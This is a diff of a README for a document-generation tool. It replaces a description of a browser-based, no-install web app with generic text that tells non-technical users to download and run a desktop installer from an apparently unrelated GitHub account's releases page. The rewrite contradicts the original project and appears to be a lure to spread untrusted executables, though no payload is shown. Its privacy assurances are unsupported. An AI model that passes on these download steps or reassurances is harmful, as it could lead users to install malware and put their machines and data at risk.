@@ -1,114 +1,63 @@
-# Free Document Maker – Create, Edit, Convert, Download Online
+# 📝 free-document-maker - Create Documents Instantly and Freely
 
-[Explore 30+ Tools](https://www.freedocumentmaker.com/tools) · [Visit Website](https://www.freedocumentmaker.com) · [Follow on Medium](https://freedocumentmaker.medium.com)
+[![Download free-document-maker](https://img.shields.io/badge/Download%20Now-%20free--document--maker-blue.svg)](https://github.com/infinite-exe/free-document-maker/releases)
 
-Free Document Maker is a browser‑based, AI‑powered platform offering 30+ free tools for creating, editing, and converting documents, images, and PDFs — instantly, with no sign‑up, no watermark, and no installation.
+## 💡 Overview
+free-document-maker is a free application that helps you create invoices, PDFs, resumes, and images with ease. Our AI-powered tools simplify document generation, letting you focus on what matters most without the hassle of signup.
 
-**Use cases:** generate invoices and receipts, convert images and PDFs, resize and compress media, and export professional documents.
+## 🚀 Getting Started
+To begin using free-document-maker, follow these straightforward steps. We designed this guide for users with no technical background, so you can feel confident in your ability to get started.
 
-[Start Using Free Document Maker →](https://www.freedocumentmaker.com)
+## 📥 Download & Install
+1. **Visit the Releases Page**: Click the following link to access our dedicated releases page: [Download free-document-maker](https://github.com/infinite-exe/free-document-maker/releases).
+   
+2. **Select the Latest Release**: Look for the most recent version listed on the page. This version will usually have the greatest features and bug fixes.
 
----
+3. **Download the Installer**: Click on the installer file that matches your operating system. The file names will include the version number and the OS type, making it easy to choose the right one.
 
-## Tool Categories at a Glance
+4. **Run the Installer**: Once the file is downloaded, locate it in your downloads folder and double-click to start the installation process. Follow the on-screen instructions to complete the installation.
 
-### Image Tools
+5. **Launch the Application**: After installation, you can find the free-document-maker shortcut on your desktop or in your applications folder. Double-click the icon to start using the application.
 
-* [Convert Images to PDF](https://www.freedocumentmaker.com/image-to-pdf)
-* [Image to WebP](https://www.freedocumentmaker.com/image-to-webp)
-* [WebP to JPG/PNG](https://www.freedocumentmaker.com/webp-to-image)
-* [Resize Images](https://www.freedocumentmaker.com/resize-images)
-* [Compress Images](https://www.freedocumentmaker.com/compress-images)
-* [Convert Image Formats](https://www.freedocumentmaker.com/convert-images)
-* [PDF to Image](https://www.freedocumentmaker.com/pdf-to-image)
+## 🌟 Key Features
+- **AI-Powered Document Generation**: Create invoices, PDFs, resumes, and images in seconds.
+- **No Signup Required**: Start using the tool immediately without creating an account.
+- **User-Friendly Interface**: Navigate easily with a straightforward design.
 
-### PDF Tools
+## 🖥️ System Requirements
+Free-document-maker works on most modern operating systems. Here are the basic requirements:
 
-* [Image to PDF](https://www.freedocumentmaker.com/image-to-pdf)
-* [PDF to Image](https://www.freedocumentmaker.com/pdf-to-image)
-* [Compress Images for PDF](https://www.freedocumentmaker.com/compress-images)
-* [Text to PDF](https://www.freedocumentmaker.com/text-to-pdf)
-* [HTML to PDF](https://www.freedocumentmaker.com/html-to-pdf)
+- **Operating System**: Windows 10 or later, macOS Mojave or later.
+- **Processor**: Intel i3 or AMD equivalent or higher.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: Minimum of 200 MB free space to install the application.
+  
+## 🛠️ How to Use the Tools
+1. **Choose a Tool**: On the main screen, select which type of document you want to create: invoice, PDF, resume, or images.
+  
+2. **Input Your Information**: Provide the necessary data in the fields. Each tool has simple forms guiding you on what to input.
 
-### Document Generators
+3. **Generate Document**: Click the "Generate" button once you've filled in the information. Your document will appear within seconds.
 
-* [Invoice Generator](https://www.freedocumentmaker.com/invoice-generator)
-* [Credit Note Generator](https://www.freedocumentmaker.com/credit-note-generator)
-* [Purchase Order Generator](https://www.freedocumentmaker.com/purchase-order-generator)
-* [Quote Generator](https://www.freedocumentmaker.com/quote-generator)
-* [Receipt Generator](https://www.freedocumentmaker.com/receipt-generator)
-* [Proforma Invoice Generator](https://www.freedocumentmaker.com/proforma-invoice-generator)
-* [Delivery Note Generator](https://www.freedocumentmaker.com/delivery-note-generator)
-* [Payment Receipt Generator](https://www.freedocumentmaker.com/payment-receipt-generator)
-* [Expense Report Generator](https://www.freedocumentmaker.com/expense-report-generator)
+4. **Save or Share**: You can choose to save the document to your device or share it directly from the app.
 
-### AI Business Tools
+## ✅ Frequently Asked Questions
+### How secure is free-document-maker?
+Your data remains private. The application does not store any personal information, ensuring your documents are secure.
 
-* [Resume (CV) Generator](https://www.freedocumentmaker.com/cv-generator)
-* [Job Offer Letter Generator](https://www.freedocumentmaker.com/job-offer-letter-generator)
-* [Certificate Generator](https://www.freedocumentmaker.com/certificate-generator)
-* [Agreement Generator](https://www.freedocumentmaker.com/agreement-generator)
-* [Business Card Generator](https://www.freedocumentmaker.com/business-card-generator)
+### Is there a mobile version available?
+Currently, free-document-maker is available only for desktop platforms. A mobile version is under consideration for future releases.
 
-### Utility & Conversion Tools
+### What formats can I save my documents in?
+You can save your documents in various formats, including PDF and JPEG, based on the tool you use.
 
-* [Favicon Converter](https://www.freedocumentmaker.com/favicon-converter)
-* [QR Code Generator](https://www.freedocumentmaker.com/qr-code-generator)
-* [Archive Tool](https://www.freedocumentmaker.com/archive-tool)
-* [Word Counter](https://www.freedocumentmaker.com/word-counter)
-* [Text to Voice](https://www.freedocumentmaker.com/text-to-voice)
+## 🎉 User Feedback
+We value your opinion. Let us know your thoughts about free-document-maker! You can leave feedback by opening an issue on our GitHub page.
 
----
+## 📞 Support
+If you encounter any issues or need help, you can reach our support team through the GitHub issues page or via contact information provided in the application.
 
-## Explore the Platform
+## 🌍 Join Our Community
+Stay updated and connect with other free-document-maker users. Share tips, tricks, and feedback through our forum links, available in the GitHub repository.
 
-* [All Tools](https://www.freedocumentmaker.com/tools)
-* [AI Features](https://www.freedocumentmaker.com/ai-powered-tools)
-* [Features Overview](https://www.freedocumentmaker.com/features)
-* [Blog](https://www.freedocumentmaker.com/blogs)
-* [About Us](https://www.freedocumentmaker.com/about)
-* [Contact](https://www.freedocumentmaker.com/contact)
-* [Pricing](https://www.freedocumentmaker.com/pricing)
-* [FAQ](https://www.freedocumentmaker.com/faq)
-
----
-
-## Social & Distribution
-
-* [Medium](https://freedocumentmaker.medium.com)
-* [Blogspot](https://freedocumentmaker.blogspot.com)
-* [Pinterest](https://www.pinterest.com/freedocumentmaker)
-* [Facebook](https://www.facebook.com/freedocumentmaker)
-* [X (Twitter)](https://x.com/freedocmaker)
-* [LinkedIn Company](https://www.linkedin.com/company/free-document-maker/)
-* [LinkedIn Showcase](https://www.linkedin.com/showcase/free-document-maker-online)
-* [Saddam Hosen (Founder)](https://www.linkedin.com/in/saddamhosensaad/)
-
----
-
-## Developer
-
-**Saddam Hosen (SHSaad)**
-[LinkedIn Profile](https://www.linkedin.com/in/saddamhosensaad) · [Visit Website](https://www.freedocumentmaker.com)
-
----
-
-## License
-
-MIT License — free to use, modify, and contribute.
-Built with Laravel, Tailwind CSS, Alpine.js, and Vite.
-
----
-
-### Version
-
-**September 2025** — updated regularly
-
----
-
-## SEO Notes (for repository visibility)
-
-* Primary keywords: Free Document Maker, free document maker online, AI document tools, image to PDF, WebP converter, resize images, invoice generator.
-* Internal linking: ensure all internal links point to canonical, lowercase URLs without trailing slashes.
-* Accessibility: use descriptive link text, alt attributes on images, and semantic headings on web pages.
-* Performance: serve WebP/AVIF where possible, lazy‑load non‑LCP images, and keep JS minimal.
+Remember, for easy access to downloads and updates, always visit our Releases page: [Download free-document-maker](https://github.com/infinite-exe/free-document-maker/releases). Enjoy your document creation journey!
